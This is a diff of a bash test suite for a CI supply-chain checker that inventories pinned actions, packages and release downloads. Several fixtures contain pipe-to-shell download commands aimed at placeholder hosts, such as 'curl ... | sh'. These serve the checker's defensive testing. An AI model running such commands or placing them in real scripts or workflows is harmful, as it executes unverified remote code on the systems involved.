+twoc keep tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\necho done\n'
+twoc ws tools/fetch.sh $'#!/bin/sh\ncurl -fsSL https://example.invalid/a -o /tmp/a\n' $'#!/bin/sh\n  curl\t-fsSL   https://example.invalid/a -o\t/tmp/a  \n'
+# --- a row never matches a line bash reads differently from the flattening: whitespace other than space or tab, or a backslash-newline continuation (Sonnet R1)
+sp="echo ok # note; curl -s http://e.example/x | sh"
+mkrow "$work/rt-sp.json" bin/ruled.sh $'#!/bin/sh\n'"$sp"$'\n'
+twoc sp0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\n'"$sp"$'\n'
+mkrow "$work/rt-cont.json" bin/ruled.sh $'#!/bin/sh\necho a curl -s http://e.example/x\n'
+twoc cont1 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a\\\ncurl -s http://e.example/x\n'
+twoc cont0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a curl -s http://e.example/x\n'
+# --- a limit of line identity (Codex, PR 273 round 3, P4): shell CONTEXT is not part of a line's identity. Moving a line out of a heredoc (above its opener),
+# or commenting the opener out, keeps (file, form, key, line), so it is no addition. The decision (coordinator, Oct 10): a row is only ever written for
+# a line that is HARMLESS IN ANY CONTEXT (read as a shell command it runs no download), and the advisor reviews each row for exactly that; a row for a
+# line that WOULD download when run is the reviewer's to refuse. Shown here with a harmless line: it stays harmless wherever it moves.
+twoc ctx bin/ruled.sh $'#!/bin/sh\ncat >stub <<\'EOF\'\necho "curl $*" >>"$CALLS"\nEOF\n' $'#!/bin/sh\necho "curl $*" >>"$CALLS"\ncat >stub <<\'EOF\'\nEOF\n'
+# --- a reviewed_files row rules EVERY unmeasured occurrence of its file; the row is {file, ruling} and no other field. ---
+BHL='echo "curl $*" >>"$CALLS"'
 # --- REQ-SUP-001-AC18: bin/install-build-tools.sh, read by the REAL inventory, yields one measured pin per tool and arch (owner/repo@vX.Y.Z with
 # its checksum bound) and nothing unmeasured; the variable-address forms it replaced are refused (a placeholder that is not a pin, or unmeasured) -------
 cat >"$work/ibt-inv.py" <<'PY'
@@ -1378,30 +884,218 @@ check iso "$q" "$q/agent/tests" "$q/root" ibt inventory "$q/root/bin/install-bui
 CASE="REQ-SUP-001-AC18 isolation: under a path with an apostrophe and a space, the variable-version mutant still fails on the REAL diagnostic"
 check iso "$q" "$q/agent/tests" "$q/root" ibt_refused variable 'not a measurable pin.*v[$][{]var[}]'
 
-# round 8 of the review (both seats): an identity digest is never truncated; brute-forced 32-bit and 40-bit collision pairs stay two items
-CASE="AC19: two local references (expressions) and two with: blocks that collided under the old 32-bit and 40-bit digests are four different identities, and swapping one for the other MOVES an item"
-check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
-import importlib.util, sys
-spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
-a, b = "./.github/workflows/${{ inputs.v81708 }}.yml", "./.github/workflows/${{ inputs.v83546 }}.yml"
-assert inv._local_name(a) != inv._local_name(b)
-assert len(inv._local_name(a).split("~")[1]) == 64
-def tree(uses, with_):
-    return {".github/workflows/a.yml": "jobs:\n  c:\n    uses: '%s'\n    with:\n      mode: %s\n" % (uses, with_)}
-k1 = set(inv.inventory(tree("./.github/workflows/callee.yml", "value98725")))
-k2 = set(inv.inventory(tree("./.github/workflows/callee.yml", "value793926")))
-assert k1 != k2 and all(len(k.split("#with:")[1]) == 64 for k in k1 | k2 if "#with:" in k), (k1, k2)
-j1, j2 = set(inv.inventory(tree(a, "x"))), set(inv.inventory(tree(b, "x")))
-assert j1 != j2
-PY
+# --- D3 (ruled): a `uses: ./<path>` line (a local action or a local reusable workflow, with or without with: or env) is a file of the same commit, not a pin ---
+# pin-age lists no version for it and refuses nothing for it; the called file is inventoried by its own rules.
+cat >"$work/callee.yml" <<EOF
+on: workflow_call
+jobs:
+  k:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@$SHA1 # v4.1.0
+EOF
+# lcall NAME USES [WITH-BLOCK]: a copy of base whose head adds .github/workflows/callee.yml and a job `c` in ci.yml calling USES (the pieces travel in files)
+lcall() {
+  local n=$1 uses=$2 with=${3:-}
+  printf '%s' "$uses" >"$work/lcall.uses"; printf '%s' "$with" >"$work/lcall.with"
+  newcase "$n" "
+import pathlib
+w = pathlib.Path('.github/workflows')
+(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
+c = w / 'ci.yml'
+uses = pathlib.Path(r'$work/lcall.uses').read_text()
+with_ = pathlib.Path(r'$work/lcall.with').read_text()
+c.write_text(c.read_text() + '  c:\n    uses: ' + uses + '\n' + with_)"
+}
+lcall l1 './.github/workflows/callee.yml'
+lws=($'    with:\n      mode: release\n      digests: ${{ needs.j.outputs.digests }}\n' $'    with:\n      tool-version: 9.9.9\n'
+     $'    with:\n      tool-version: ${{ inputs.v || \'9.9.9\' }}\n' $'    with:\n      pin: v2.17.1\n'
+     $'    with:\n      digest: sha256:'"$(printf '7%.0s' $(seq 64))"$'\n')
+i=0
+i=0
+newcase lmoved "
+import pathlib
+w = pathlib.Path('.github/workflows')
+(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text().replace('$SHA1', '$NEW1'))
+c = w / 'ci.yml'
+c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/callee.yml\n')"
+runck lmoved
 
-CASE="full sha256: every committed local-call row is a 64-hex key equal to its line, and a ruling that starts with the call phrase"
-check python3 - "$root/.github/supply-chain-exceptions.json" <<'PY'
-import json, re, sys
-for r in json.load(open(sys.argv[1]))["unmeasured_text"]:
-    if r["form"] == "a local reusable workflow call":
-        assert r["key"] == r["line"] and re.fullmatch(r"[0-9a-f]{64}", r["key"]) and r["ruling"].startswith("local reusable workflow call; "), r
+# --- REQ-SUP-001-an unpinned package named by a script line, in a file a reviewed_files row names (the mechanism, no parser) ---
+# A script line whose pip install names a package with no version is an item that cannot pass. The base branch's exceptions file may rule it with a reviewed_files
+# row of the file ({file, ruling}). Only a script (*.sh) outside .github/agent/ can be ruled; the same text in a workflow
+# step, or in a script under .github/agent/, fails as before; a line the base already holds is never ruled.
+pk_line="       'run: |\\n          bash bin/witnessed.sh apk bin/build-stage-apk.sh\\n          pip install requests'"
+pyk() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }
+# pkrows OUT MODE FILE LINE REPO: the exceptions file, the row of FILE (file and ruling, written by rf.py)
+pkrows() {
+  local mode=$2; [ "$mode" = count2 ] && mode=all
+  python3 "$work/rf.py" "$1" "$5" "$mode" "$3"
+}
+newcase pk "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
+$pk_line
+")"
+CASE="only the package items THAT line made leave the moved list: the package is neither a finding nor listed as moved"
+check bash -c "! grep -q 'pypi/requests' '$work/pk.out'"; check bash -c "! grep -q 'pypi/requests' '$work/pk.json'"
+newcase pkedit "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
+${pk_line/requests/requests2}
+")"
+pkrows "$work/pk-orig.json" ok bin/judge-test.sh "$pk_line" "$work/pk"
+newcase pktwo "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
+$pk_line
+$pk_line
+")"
+newcase pkwf "
+import pathlib
+c = pathlib.Path('.github/workflows/ci.yml')
+c.write_text(c.read_text() + '      - run: pip install requests\n')"
+newcase pkpinned "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
+pip install fixture-pkg==3.1.4 --hash=sha256:aaaa
+")"
+newcase pkff "$(pyk bin/judge-test.sh "#!/usr/bin/env bash
+$(printf 'pip install requests\f')
+")"
+
+# --- D3, more spellings of a local line: no item, nothing refused ---
+# lcallc NAME USES [WITH] [CALLEE-TEXT-FILE]: like lcall, with the callee's text taken from a file
+lcallc() {
+  local n=$1 uses=$2 with=${3:-} callee=${4:-$work/callee.yml}
+  printf '%s' "$uses" >"$work/lcall.uses"; printf '%s' "$with" >"$work/lcall.with"
+  newcase "$n" "
+import pathlib
+w = pathlib.Path('.github/workflows')
+(w / 'callee.yml').write_text(pathlib.Path(r'$callee').read_text())
+c = w / 'ci.yml'
+uses = pathlib.Path(r'$work/lcall.uses').read_text()
+with_ = pathlib.Path(r'$work/lcall.with').read_text()
+c.write_text(c.read_text() + '  c:\n    uses: ' + uses + '\n' + with_)"
+}
+lcallc m1 './.github/workflows/callee.yaml'
+lcallc m2 './.github/workflows/ca..llee.yml'
+printf '%s' "\" ./.github/workflows/callee.yml\"" >"$work/lcall.uses"
+newcase m3 "
+import pathlib
+w = pathlib.Path('.github/workflows')
+(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
+c = w / 'ci.yml'
+c.write_text(c.read_text() + '  c:\n    uses: \" ./.github/workflows/callee.yml\"\n')"
+printf '%s\n' 'on: workflow_call' >"$work/callee-empty.yml"
+lcallc m4 './.github/workflows/callee.yml' '' "$work/callee-empty.yml"
+cat >"$work/callee-notcall.yml" <<EOF
+on: push
+jobs:
+  k:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@$SHA1 # v4.1.0
+EOF
+lcallc m6 './.github/workflows/callee.yml' '' "$work/callee-notcall.yml"
+lcallc m7 './.github/workflows/callee.yml' $'    with:\n      mode2: release\n'
+lcallc m8 './.github/workflows/callee.yml' $'    with:\n      mode: café\n'
+lcallc m9 './.github/workflows/callee.yml' $'    with:\n      steps: [one, \'two2\']\n'
+lcallc menv './.github/workflows/callee.yml' $'    secrets: inherit\n    with:\n      mode: release\n'
+cat >"$work/callee-dl.yml" <<EOF
+on: workflow_call
+jobs:
+  k:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -fsSL https://example.invalid/tool.sh | sh
+EOF
+lcallc m11 './.github/workflows/callee.yml' '' "$work/callee-dl.yml"
+newcase mstep "
+import pathlib
+w = pathlib.Path('.github/workflows')
+(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
+c = w / 'ci.yml'
+c.write_text(c.read_text().replace('    steps:\n      - uses: actions/checkout@$SHA1 # v4.1.0\n', '    steps:\n      - uses: ./.github/workflows/callee.yml\n      - uses: actions/checkout@$SHA1 # v4.1.0\n', 1))"
+# a local call whose with: input changes between base and head: nothing is listed or refused
+rm -rf "$work/mchg"; cp -R "$base" "$work/mchg"
+( cd "$work/mchg" && python3 - "$work/callee.yml" <<'PY'
+import pathlib, subprocess, sys
+w = pathlib.Path('.github/workflows')
+(w / 'callee.yml').write_text(pathlib.Path(sys.argv[1]).read_text())
+c = w / 'ci.yml'
+c.write_text(c.read_text() + '  c:\n    uses: " ./.github/workflows/callee.yml"\n    with:\n      pin: v1.0.0\n')
+subprocess.run(["git", "add", "-A"], check=True)
+subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-qm", "base2"], check=True)
+c.write_text(c.read_text().replace("v1.0.0", "v9.9.9"))
+subprocess.run(["git", "add", "-A"], check=True)
+subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-qm", "head2"], check=True)
 PY
+)
+
+# the line identity
+printf '%s\n' '#!/usr/bin/env bash' 'DEPS=requests' 'pip install "$DEPS"' >"$work/mix-base.sh"
+printf '%s\n' '#!/usr/bin/env bash' 'DEPS=flask' 'pip install "$DEPS"' '# pip install fixture' >"$work/mix-head.sh"
+rm -rf "$work/mix"; cp -R "$base" "$work/mix"
+( cd "$work/mix" && cp "$work/mix-base.sh" bin/mix-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm b2 && cp "$work/mix-head.sh" bin/mix-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm h2 )
+newcase pkscan "
+import pathlib
+f = pathlib.Path('bin/install-scanner.sh')
+f.write_text(f.read_text() + 'echo \"fixture pip install requests\"\n')"
+# the advisory audit judges the same line once: with a row it is not an advisory hit, without it it is (exit 1)
+audfx() {  # REPO OUT: a fixtures file with an advisory against the repo's unpinned requests item
+  python3 - "$work/$1" "$2" "$here/../supply-chain/pin-inventory.py" <<'PY'
+import importlib.util, json, sys
+spec = importlib.util.spec_from_file_location("inv", sys.argv[3]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+k = [k for k in inv.load_at(sys.argv[1], None) if k.startswith("package:pypi/requests@(unpinned)")]
+assert len(k) == 1, k
+json.dump({"lists": {k[0]: {"github": [{"id": "GHSA-test-test-test", "incident": "INC-T", "affected": True, "modified": "2026-09-01T00:00:00Z"}], "osv": []}},
+           "upstream": {}, "prs": []}, open(sys.argv[2], "w"))
+PY
+}
+audfx pk "$work/aud.fx.json"
+# --- round 2 of the review of PR 329: state between calls, a relay, a self-call, an identical copy, a fractional clock -------------------------------------
+cat >"$work/callee2.yml" <<EOF
+on: workflow_call
+jobs:
+  k:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/cache@$SHA5 # v4.2.0
+EOF
+newcase two "
+import pathlib
+w = pathlib.Path('.github/workflows')
+(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee.yml').read_text())
+(w / 'callee2.yml').write_text(pathlib.Path(r'$work/callee2.yml').read_text())
+c = w / 'ci.yml'
+c.write_text(c.read_text() + '  c1:\n    uses: ./.github/workflows/callee.yml\n  c2:\n    uses: ./.github/workflows/callee2.yml\n')"
+# the second call already in the base, the first added in the head: the unchanged second must not move
+rm -rf "$work/two2"; cp -R "$base" "$work/two2"
+( cd "$work/two2" && python3 - "$work" <<'PY'
+import pathlib, subprocess, sys
+work = sys.argv[1]
+w = pathlib.Path('.github/workflows')
+(w / 'callee.yml').write_text(pathlib.Path(work + '/callee.yml').read_text())
+(w / 'callee2.yml').write_text(pathlib.Path(work + '/callee2.yml').read_text())
+c = w / 'ci.yml'
+c.write_text(c.read_text() + '  c2:\n    uses: ./.github/workflows/callee2.yml\n')
+g = lambda *a: subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True)
+g("add", "-A"); g("commit", "-qm", "b")
+c.write_text(c.read_text() + '  c1:\n    uses: ./.github/workflows/callee.yml\n')
+g("add", "-A"); g("commit", "-qm", "h")
+PY
+)
+printf 'on: workflow_call\njobs:\n  j:\n    uses: ./.github/workflows/selfcall.yml\n' >"$work/selfcall.yml"
+newcase selfc "
+import pathlib
+w = pathlib.Path('.github/workflows')
+(w / 'selfcall.yml').write_text(pathlib.Path(r'$work/selfcall.yml').read_text())
+c = w / 'ci.yml'
+c.write_text(c.read_text() + '  c:\n    uses: ./.github/workflows/selfcall.yml\n')"
+# an identical copy added beside an unchanged install line whose assignment changed
+printf '%s\n' '#!/usr/bin/env bash' 'DEPS=requests' 'pip install "$DEPS"' >"$work/cp-base.sh"
+printf '%s\n' '#!/usr/bin/env bash' 'DEPS=flask' 'pip install "$DEPS"' 'pip install "$DEPS"' >"$work/cp-head.sh"
+rm -rf "$work/cp"; cp -R "$base" "$work/cp"
+( cd "$work/cp" && cp "$work/cp-base.sh" bin/cp-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm b3 && cp "$work/cp-head.sh" bin/cp-test.sh && git add -A && git -c user.name=t -c user.email=t@x commit -qm h3 )
+pkrows "$work/pk-cp.json" ok bin/cp-test.sh 'pip install "$DEPS"' "$work/cp"
+audfx cp "$work/aud-cp.fx.json" 2>/dev/null || true
+# D3 with a with: block on a local call (a block, and an empty block)
+printf '%s\n' "on: workflow_call" "jobs:" "  k:" "    runs-on: ubuntu-latest" "    steps:" "      - uses: actions/checkout@$SHA1 # v4.1.0" >"$work/callee-w.yml"
+lcallc w1 './.github/workflows/callee.yml' $'    with:\n      mode: release\n' "$work/callee-w.yml"
+lcallc w2 './.github/workflows/callee.yml' $'    with: {}\n' "$work/callee-w.yml"
 
 CASE="full sha256: the collision pairs both seats reproduced under the old 32-48 bit tags (a checksum set, a step tag of an expression, a default-installer step) are different identities"
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
@@ -1423,15 +1117,35 @@ for k in keys(c("7158")) | keys(w("v205063")):
         assert len(tag.split(":")[-1]) == 64, k
 PY
 
-# REQ-SUP-001-AC22: the committed list names the archive index record exactly (the daily refresh pull request moves it; rule 48: no seven-day hold on Wolfi)
-CASE="AC22: the committed .github/policy/base-inputs.json names build/locks/archive-index.sha256 exactly once, beside the archive key record"
-check python3 - "$root/.github/policy/base-inputs.json" <<'PY'
-import json, sys
-d = json.load(open(sys.argv[1]))["base_inputs"]
-assert d.count("build/locks/archive-index.sha256") == 1 and "build/locks/archive-keys.sha256" in d, d
-PY
+# --- REQ-SUP-001-a file named by .github/policy/base-inputs.json is no item (orchestrator Oct 14: the plainest closed form, no pattern on names) ---------------
+# The list is read from the base branch's copy beside the script (CI: trusted/), or --base-inputs FILE; a file listed there is the repository's own base record
+# (its content change is the chain's base-input-changed signal). A missing list exempts nothing; a malformed one stops the check (exit 2).
+printf '%s\n' "sha256:aaaa  x" >"$work/bi-keys.sha256"
+newcase bi "
+import pathlib
+p = pathlib.Path('build/locks'); p.mkdir(parents=True, exist_ok=True)
+(p / 'archive-keys.sha256').write_text('wolfi-signing.rsa.pub sha256:' + 'a' * 64 + '\\n')
+(p / 'archive-index.sha256').write_text('x86_64 sha256:' + 'b' * 64 + '\\n')"
+# the checker's default list is the copy beside the script: a copy of the agent directory with an EMPTY policy list stands for "no list" (the tree itself may carry a real one)
+mkdir -p "$work/sc/.github/policy" && cp -R "$here/.." "$work/sc/.github/agent" && printf '%s' '{"base_inputs": []}' >"$work/sc/.github/policy/base-inputs.json"
+chk_nolist="$work/sc/.github/agent/supply-chain/pin-age-check.py"
+printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", "build/locks/archive-index.sha256"]}' >"$work/bi-ok.json"
+printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256"]}' >"$work/bi-one.json"
+printf '%s' '{"base_inputs": ["build/locks/other.sha256", "./build/locks/archive-keys.sha256", "build/locks/../locks/archive-keys.sha256"]}' >"$work/bi-near.json"
+printf '%s' '{"base_inputs": "build/locks/archive-keys.sha256"}' >"$work/bi-str.json"
+printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", 7]}' >"$work/bi-int.json"
+printf '%s' '{"base_inputs": [], "base_inputs": ["build/locks/archive-keys.sha256"]}' >"$work/bi-dup.json"
+printf '%s' 'not json' >"$work/bi-bad.json"
+printf '%s' '{"base_inputs": []}' >"$work/bi-empty.json"
+rm -rf "$work/bi3"; cp -R "$work/bi" "$work/bi3"
+( cd "$work/bi3" && printf '%s\n' "x86_64 sha256:cccc" >build/locks/archive-index.sha256.bak && mkdir -p docs && printf '%s\n' "x86_64 sha256:dddd" >docs/archive-index.sha256 && git add -A && git -c user.name=t -c user.email=t@x commit -qm lookalikes )
+# a pull request's own list is never read: the default is the copy beside the script, not the tree under --root
+rm -rf "$work/bi2"; cp -R "$work/bi" "$work/bi2"
+( cd "$work/bi2" && printf '%s\n' "x86_64 sha256:eeee" >build/locks/zz-record.sha256 && mkdir -p .github/policy && printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", "build/locks/archive-index.sha256", "build/locks/zz-record.sha256"]}' >.github/policy/base-inputs.json && git add -A && git -c user.name=t -c user.email=t@x commit -qm list )
+# a missing default list lists nothing: a copy of the supply-chain dir with no .github/policy/base-inputs.json beside it exempts nothing and is not an error
+rm -rf "$work/nl"; mkdir -p "$work/nl/.github/agent"; cp -R "$(dirname "$chk")" "$work/nl/.github/agent/supply-chain"
 
-CASE="two release downloads whose asset names differ only in the shell variable (or expression) they hold are two items, a changed variable is a moved item, and a concrete asset keeps its key (REQ-SUP-001-AC2: the check names every version that moved, a moved asset behind a variable included)"
+CASE="two release downloads whose asset names differ only in the shell variable (or expression) they hold are two items, a changed variable is a moved item, and a concrete asset keeps its key (REQ-SUP-001-the check names every version that moved, a moved asset behind a variable included)"
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
@@ -1453,7 +1167,7 @@ wf = lambda asset: {".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs
 assert set(inv.inventory(wf("${A}.tgz"))) != set(inv.inventory(wf("${B}.tgz")))
 PY
 
-CASE="release downloads behind variables or expressions, round 1 findings: two assets in one step are two items; an identical added occurrence is a moved item; whitespace inside an expression literal is part of the identity; a scanner assignment and a composite input default are part of the identity (REQ-SUP-001-AC2: the check names every version that moved)"
+CASE="release downloads behind variables or expressions, round 1 findings: two assets in one step are two items; an identical added occurrence is a moved item; whitespace inside an expression literal is part of the identity; a scanner assignment and a composite input default are part of the identity (REQ-SUP-001-the check names every version that moved)"
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
@@ -1472,18 +1186,7 @@ co = lambda v: {".github/actions/x/action.yml": "name: x\ninputs:\n  asset:\n   
 assert len(inv.moved(inv.inventory(co("x.tgz")), inv.inventory(co("y.tgz")))) == 1
 PY
 
-CASE="an item whose asset path is a placeholder is no pin: judge_item refuses it (REQ-SUP-001-AC2, AC3)"
-check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
-import importlib.util, sys, datetime as dt
-def load(n, p):
-    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
-inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
-it = next(iter(inv.inventory({"bin/x.sh": "curl -fsSL https://github.com/o/r/releases/download/v1.2.3/${A}.tgz -o x\n"}).values()))
-ok = age.judge_item(it)[0]
-assert ok is False
-PY
-
-CASE="release downloads behind variables, round 2 findings: a later assignment, an indirect assignment (A=\$B) and the whitespace of a continued value are part of a script download's identity; a local composite call's with: value is part of the call's identity; an unrelated placeholder item keeps the key it had (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 2 findings: a later assignment, an indirect assignment (A=\$B) and the whitespace of a continued value are part of a script download's identity; a local composite call's with: value is part of the call's identity; an unrelated placeholder item keeps the key it had "
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
@@ -1504,7 +1207,7 @@ wfk = {".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-l
 assert set(inv.inventory(wfk)) == {"package:pypi/black@(unpinned)#step:875cc02f02e6bc952fc1bca71c436657c10fc7e27058713fbd137cf0aed5eed8"}
 PY
 
-CASE="release downloads behind variables, round 3 findings: assignment ORDER, a name holding \$( ) with a space, composite input context kept apart from other items' keys, and a query variable that is not part of the name (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 3 findings: assignment ORDER, a name holding \$( ) with a space, composite input context kept apart from other items' keys, and a query variable that is not part of the name "
 check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
 import importlib.util, sys, datetime as dt
 def load(n, p):
@@ -1525,7 +1228,7 @@ assert set(inv.inventory(comp)) == {"package:pypi/black@(unpinned)#step:c38ddd42
 assert all(it.step for it in inv.inventory(wf("x.tgz?download=${A}")).values())   # a quoted string holding a variable is unresolved (whole-file identity): fail-closed, advisor 0442
 PY
 
-CASE="release downloads behind variables, round 3 (seat B): reordered assignments, the spacing of a continued value inside the download line itself, and the literals of an expression in a latest/download URL are each part of the identity (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 3 (seat B): reordered assignments, the spacing of a continued value inside the download line itself, and the literals of an expression in a latest/download URL are each part of the identity "
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys, json
 s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
@@ -1540,7 +1243,7 @@ latest = "curl https://github.com/o/r/releases/latest/download/${{ contains('a  
 assert coll(".github/workflows/ci.yml", wf(latest), wf(latest.replace("'a  b'", "'a b'")))
 PY
 
-CASE="release downloads behind variables, round 4 findings: a variable after a quote that closed the URL, a name with a command substitution or backticks or a positional parameter, and assignments in the forms A=x B=old, export A=x B=old and declare -r A= are each part of the identity and refused (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 4 findings: a variable after a quote that closed the URL, a name with a command substitution or backticks or a positional parameter, and assignments in the forms A=x B=old, export A=x B=old and declare -r A= are each part of the identity and refused "
 check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
 import importlib.util, sys, json, datetime as dt
 def load(n, p):
@@ -1561,7 +1264,7 @@ for path in ("bin/x.sh", "bin/install-scanner.sh"):
         assert inv.moved(inv.inventory({path: pre + "old\n" + dl}), inv.inventory({path: pre + "new\n" + dl})), (path, pre)
 PY
 
-CASE="release downloads behind variables, round 5 findings: a quoted exported assignment (export \"A=\$B\") is part of the identity, and a quote inside an earlier command substitution does not change a concrete asset's key (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 5 findings: a quoted exported assignment (export \"A=\$B\") is part of the identity, and a quote inside an earlier command substitution does not change a concrete asset's key "
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys
 s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
@@ -1576,7 +1279,7 @@ for pre in ("x=$(printf '%s' ok); ", 'x=$(printf "%s" ok); ', "x=$(echo 'a)b'); 
     assert {it.key for it in items} == {"tool:o/r/x.tgz@v1.2.3"}, (pre, [it.key for it in items])
 PY
 
-CASE="release downloads behind variables, round 6 findings: a variable read only inside \$(( )), a concrete download inside a command substitution, and the caller's env of a local composite call are part of the identity or leave the concrete key alone (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 6 findings: a variable read only inside \$(( )), a concrete download inside a command substitution, and the caller's env of a local composite call are part of the identity or leave the concrete key alone "
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys, json
 s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
@@ -1593,7 +1296,7 @@ def tree(asset):
 assert inv.moved(inv.inventory(tree("old")), inv.inventory(tree("new")))
 PY
 
-CASE="release downloads behind variables, round 7 findings: an array element write and an indirect or indexed expansion are part of the identity, the inherited workflow env and matrix are part of a local action call's identity, a concrete download in double-quoted backticks or in a quoted URL followed by arguments keeps its concrete key (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 7 findings: an array element write and an indirect or indexed expansion are part of the identity, the inherited workflow env and matrix are part of a local action call's identity, a concrete download in double-quoted backticks or in a quoted URL followed by arguments keeps its concrete key "
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys, json
 s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
@@ -1618,7 +1321,7 @@ for run in ('body="`curl ' + url + 'x.tgz -o x`"', 'curl "' + url + 'x.tgz" -o "
     assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, (run, sorted(inv.inventory({"bin/x.sh": run + "\n"})))
 PY
 
-CASE="release downloads behind variables, round 7 findings (seat A): a name written by printf -v or read, a name written to GITHUB_ENV by an earlier step, a concrete download inside a quoted program string, and a plain local action call under on: push keeps its key (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 7 findings (seat A): a name written by printf -v or read, a name written to GITHUB_ENV by an earlier step, a concrete download inside a quoted program string, and a plain local action call under on: push keeps its key "
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys, json
 s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
@@ -1641,7 +1344,7 @@ plain = {".github/actions/x/action.yml": "name: x\nruns:\n  using: composite\n  
 assert all(k.endswith("@(local)") for k in inv.inventory(plain) if k.startswith("action:local")), sorted(inv.inventory(plain))
 PY
 
-CASE="release downloads behind variables, round 7 findings (seat B): a quoted parenthesis, an indirection through an assignment and a multiline array cannot hide a changed asset because an unresolved asset is identified by its whole file (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 7 findings (seat B): a quoted parenthesis, an indirection through an assignment and a multiline array cannot hide a changed asset because an unresolved asset is identified by its whole file "
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys, json
 s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
@@ -1661,7 +1364,7 @@ for path in ("bin/x.sh", "bin/install-scanner.sh"):
     assert set(inv.inventory(conc("a"))) == {"tool:o/r/x.tgz@v1.2.3"}
 PY
 
-CASE="release downloads behind variables, round 8 findings (same class, nested quoting): a release URL inside a quoted program string that holds a variable, a substitution or a command separator is unresolved (whole-file identity, refused by the age judge), a variable after a quoted parenthesis is part of the name, and a plain quoted download keeps its key (REQ-SUP-001-AC2)"
+CASE="release downloads behind variables, round 8 findings (same class, nested quoting): a release URL inside a quoted program string that holds a variable, a substitution or a command separator is unresolved (whole-file identity, refused by the age judge), a variable after a quoted parenthesis is part of the name, and a plain quoted download keeps its key "
